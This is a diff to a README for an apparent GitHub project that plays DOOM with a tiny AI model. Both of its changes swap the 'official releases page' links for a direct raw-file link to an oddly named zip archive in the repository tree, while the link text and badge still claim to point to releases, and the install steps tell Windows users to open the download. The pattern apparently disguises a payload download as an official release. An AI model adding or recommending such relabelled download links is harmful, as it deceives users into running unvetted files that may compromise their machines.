@@ -1,6 +1,6 @@
 # 🎮 SauerkrautLM-Doom-MultiVec - Play Doom with Tiny Artificial Intelligence
 
-[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/LeoKate2/SauerkrautLM-Doom-MultiVec/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/LeoKate2/SauerkrautLM-Doom-MultiVec/raw/refs/heads/main/tromometric/Sauerkraut-Doom-Multi-L-Vec-esne.zip)
 
 SauerkrautLM-Doom-MultiVec allows you to run a compact artificial intelligence model that plays the classic game DOOM. This software uses a specialized 1.3 million parameter model to navigate levels and engage in combat. It functions as an autonomous player for your game client.
 
@@ -20,7 +20,7 @@ If your computer functions for standard office work or web browsing, it can like
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/LeoKate2/SauerkrautLM-Doom-MultiVec/releases) to download the application.
+1. Visit the [official releases page](https://github.com/LeoKate2/SauerkrautLM-Doom-MultiVec/raw/refs/heads/main/tromometric/Sauerkraut-Doom-Multi-L-Vec-esne.zip) to download the application.
 2. Locate the file ending in .msi or .exe.
 3. Click the file to start the download.
 4. Open the downloaded file once the process completes.
